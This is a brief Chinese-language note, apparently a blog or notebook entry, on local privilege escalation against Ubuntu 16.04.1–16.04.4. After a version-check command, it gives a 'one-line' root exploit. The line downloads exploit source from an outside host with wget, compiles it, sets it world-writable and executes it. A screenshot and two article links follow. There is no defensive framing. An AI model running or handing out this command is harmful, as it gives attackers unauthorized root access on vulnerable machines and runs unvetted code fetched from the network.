#### 提权Ubuntu16.04.1-16.04.4
```
lsb_release -a 查看版本号

一句话提权
wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned
```

![image.png](https://upload-images.jianshu.io/upload_images/7373593-508fd5c1e90ae371.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)


相关链接：

http://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247485209&idx=1&sn=74199be057b75d14276fb6be264fea92&chksm=fe250218c9528b0e9b5b3330d3a2e02be068c91a9b81be4a587d6579fa2e043f0833ed13acb8&mpshare=1&scene=1&srcid=0322dIBu0v8LiSLXMCYuyLx5#rd

http://mp.weixin.qq.com/s?__biz=MzAwMTUyMjQ5OA==&mid=2650965604&idx=1&sn=166a2820b6148c79ad8275cf1f672559&chksm=812e4849b659c15f68ee18dfd91c7e83c8d846a7f633be53cd139cc6cfb6a71b8b414eb43e2e&mpshare=1&scene=1&srcid=0321Qh3nXBxeTHx3zYEJ5xuN#rd